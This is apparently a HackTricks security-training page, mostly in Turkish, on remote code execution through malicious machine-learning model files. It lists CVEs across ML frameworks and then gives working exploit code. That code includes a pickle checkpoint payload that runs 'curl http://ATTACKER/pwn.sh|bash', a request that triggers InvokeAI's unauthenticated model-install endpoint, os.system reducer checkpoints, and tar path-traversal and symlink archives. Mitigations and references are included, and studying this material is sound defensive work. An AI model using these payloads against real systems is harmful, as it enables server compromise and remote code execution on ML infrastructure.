# Modeller RCE

{{#include ../banners/hacktricks-training.md}}

## Modelleri RCE'ye yükleme

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklı formatlarda paylaşılır. Bu modeller geliştirici makinelerine veya üretim sistemlerine yüklenip kullanılabilir. Genellikle modeller kötü amaçlı kod içermez, ancak bazı durumlarda model, kasıtlı bir özellik veya model yükleme kütüphanesindeki bir zafiyet nedeniyle sistemde rastgele kod çalıştırmak için kullanılabilir.

Yazım sırasında bu tür zafiyetlere bazı örnekler şunlardır:

| **Framework / Araç**        | **Zafiyet (CVE varsa)**                                                    | **RCE Vektörü**                                                                                                                           | **Referanslar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` içinde güvensiz deserializasyon* **(CVE-2025-32434)**                                                              | Model checkpoint'indeki kötü amaçlı pickle kod çalıştırmaya yol açar ( `weights_only` korumasını atlar)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kötü amaçlı model indirme kod çalıştırmaya yol açar; yönetim API'sinde Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` üzerinden güvensiz checkpoint deserializasyonu **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint `load_model_trainer_states_from_checkpoint` sırasında pickle reducer tetikler → ML worker'da kod çalıştırma            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (güvensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'den model yüklemek `yaml.unsafe_load` kullanıyor (kod çalıştırma) <br> **Lambda** katmanıyla model yüklemek rastgele Python kodu çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Kusurlu `.tflite` model tamsayı taşmasına neden olur → heap bozulması (potansiyel RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` ile model yüklemek, saldırganın `__reduce__` payload'unu içeren pickle'ı çalıştırır                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (güvensiz `np.load`) *tartışmalı*                                                                              | Varsayılan olarak `numpy.load` pickled object array'lerine izin verir – kötü amaçlı `.npy/.npz` kod çalıştırma tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights yolu dizinden çıkabilir (rastgele dosyaları okuma) <br> Kötü amaçlı ONNX model tar'ı rastgele dosyaları üzerine yazabilir (RCE'ye yol açabilir) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator içeren model, saldırganın native kodunu yüklemeyi gerektirebilir; karmaşık model grafikleri, istenmeyen hesaplamaları çalıştırmak için mantığı kötüye kullanabilir   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkin iken model-load API'sinin kullanılması, dosya yazmak için göreli yol traversaline izin verir (ör. RCE için `.bashrc` üzerine yazma)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (birden çok heap overflow)                                                                         | Bozuk GGUF model dosyası, ayrıştırıcıda heap buffer overflow'larına neden olup hedef sistemde rastgele kod çalıştırmaya olanak sağlar                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda katmanlı kötü amaçlı HDF5 (`.h5`) model hâlâ yüklemede kod çalıştırır (Keras safe_mode eski formatu kapsamaz – “downgrade attack”) | |
| **Others** (general)        | *Tasarım hatası* – Pickle serialization                                                                                         | Birçok ML aracı (örn. pickle-tabanlı model formatları, Python `pickle.load`) model dosyalarına gömülen rastgele kodu mitigasyon yoksa çalıştırır | |

Ayrıca, [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi bazı python pickle tabanlı modeller, `weights_only=True` ile yüklenmezlerse sistemde rastgele kod çalıştırmak için kullanılabilir. Bu yüzden, tabloda listelenmemiş olsalar bile herhangi bir pickle tabanlı model bu tür saldırılara özellikle duyarlı olabilir.

### 🆕 InvokeAI `torch.load` üzerinden RCE (CVE-2024-12029)

`InvokeAI` Stable-Diffusion için popüler bir açık kaynaklı web arayüzüdür. Sürümler **5.3.1 – 5.4.2** kullanıcıların modelleri rastgele URL'lerden indirip yüklemesine izin veren `/api/v2/models/install` REST endpoint'ini açığa çıkarır.

İçeride endpoint eninde sonunda şu çağrıyı yapar:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### İstismar adımları

1. Kötü amaçlı bir checkpoint oluşturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Kontrolünüzdeki bir HTTP sunucusunda `payload.ckpt` dosyasını barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Zafiyetli endpoint'i tetikleyin (no authentication required):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan InvokeAI sürecinin bağlamında kod yürütmeyi ele geçirir.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` saldırgan tarafından erişilebilir olmalı  
•  Sürecin shell komutlarını çalıştırma izni olmalı

#### Önlemler

* InvokeAI'yi **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama varsayılan olarak `scan=True` ayarı getirir ve deserialization öncesinde kötü amaçlı yazılım taraması yapar.  
* Checkpoint'leri programatik olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) yardımcı fonksiyonunu kullanın.  
* Model kaynakları için izin listeleri (allow-lists) / imzalar (signatures) uygulayın ve servisi en düşük ayrıcalıklarla çalıştırın.

> ⚠️ Unutmayın ki **herhangi bir** Python pickle tabanlı format (çok sayıda `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) güvenilmeyen kaynaklardan deserialize edilmek için doğası gereği güvensizdir.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA'nin Transformers4Rec'i (Merlin'in bir parçası), kullanıcı tarafından sağlanan yollarda doğrudan `torch.load()` çağıran güvensiz bir checkpoint yükleyicisi açığa çıkardı. Çünkü `torch.load`, Python `pickle`'a dayanır; saldırgan kontrollü bir checkpoint, deserializasyon sırasında bir reducer aracılığıyla rastgele kod çalıştırabilir.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: Python pickle'da bir obje, callable ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Callable, unpickling sırasında çalıştırılır. Böyle bir obje bir checkpoint'te varsa, herhangi bir ağırlık kullanılmadan önce çalışır.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Teslim vektörleri ve etki alanı:
- Trojanized checkpoints/models repos, buckets veya artifact registries aracılığıyla paylaşılan
- Checkpoint'ları otomatik olarak yükleyen resume/deploy pipeline'ları
- Çalıştırma, genellikle yükseltilmiş ayrıcalıklarla (ör. container'larda root) training/inference worker'ları içinde gerçekleşir

Düzeltme: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) doğrudan `torch.load()` çağrısını `transformers4rec/utils/serialization.py` içinde uygulanan kısıtlı, allow-listed bir deserializer ile değiştirdi. Yeni loader türleri/alanları doğrular ve yükleme sırasında keyfi callable'ların çağrılmasını engeller.

PyTorch checkpoint'larına özel savunma önerileri:
- Güvenilmeyen veriyi unpickle etmeyin. Mümkünse [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi yürütülebilir olmayan formatları tercih edin.
- Eğer PyTorch serialization kullanmanız gerekiyorsa, `weights_only=True` (yeni PyTorch sürümlerinde desteklenir) ayarını sağlayın veya Transformers4Rec yamasıyla benzer şekilde custom allow-listed bir unpickler kullanın.
- Model kaynak/imzalarını zorunlu kılın ve deserializasyonu sandbox içinde yapın (seccomp/AppArmor; non-root kullanıcı; kısıtlı FS ve ağ çıkışı yok).
- Checkpoint yükleme sırasında ML servislerinden beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanımını trace edin.

POC ve vulnerable/patch referansları:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Örnek – kötü amaçlı bir PyTorch modeli oluşturma

- Modeli oluşturun:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yükle:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modellerde Path Traversal

Bu konuda [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği gibi, farklı AI framework'leri tarafından kullanılan model formatlarının çoğu genellikle `.zip` gibi arşiv tabanlıdır. Bu nedenle, bu formatları suistimal ederek path traversal attacks gerçekleştirmek ve modelin yüklendiği sistemden rastgele dosyaları okumak mümkün olabilir.

Örneğin, aşağıdaki kodla yüklendiğinde `/tmp` dizininde bir dosya oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ya da, aşağıdaki kod ile yüklendiğinde `/tmp` dizinine bir symlink oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Derinlemesine: Keras .keras deserialization and gadget hunting

.Daha fazla bilgi için .keras iç yapısı, Lambda-layer RCE, ≤ 3.8'deki arbitrary import sorunu ve allowlist içindeki post-fix gadget discovery üzerine odaklanmış bir rehber için, bakın:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Kaynaklar

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
